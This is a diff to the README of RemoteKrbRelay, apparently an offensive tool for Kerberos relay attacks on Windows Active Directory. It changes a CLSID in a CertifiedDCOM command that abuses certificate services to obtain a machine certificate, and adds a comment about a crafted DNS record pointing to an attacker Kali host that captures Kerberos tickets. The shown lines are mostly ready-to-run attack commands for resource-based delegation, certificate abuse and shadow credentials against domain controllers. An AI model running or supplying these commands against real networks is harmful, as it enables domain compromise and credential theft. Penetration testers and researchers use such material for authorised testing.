@@ -29,7 +29,7 @@ Learn more about CertifiedDCOM [here](https://blackhat.com/asia-24/briefings/sch
   .\RemoteKrbRelay.exe -rbcd -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -cn FAKEMACHINE$
 
 # CertifiedDCOM (Abuse ADCS to get Machine cert)
-   .\RemoteKrbRelay.exe -adcs -template Machine -victim adcs.root.apchi -target dc01.root.apchi -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
+   .\RemoteKrbRelay.exe -adcs -template Machine -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
 
 # CertifiedDCOM (Abuse ADCS with ShadowCreds)
   .\RemoteKrbRelay.exe -shadowcred -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -forceshadowcred
@@ -280,6 +280,7 @@ Also LAPS, changing user password, smb....
 .\RemoteKrbRelay.exe -ldapwhoami -victim win10.vostok.street -target dc01.vostok.street -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -local dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAAA
 
 # but I haven't implemented the relay from Initial OXID Request yet. Do it BRO! :)
+# dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAAA <- this is DNS A record that points to kali (thx to CredMarshalTargetInfo() because i can receive tkt on RPCSS/dc01)
 ```
 
 - [ ] U can get TGT in AP-REQ. What if des cryptography is used?
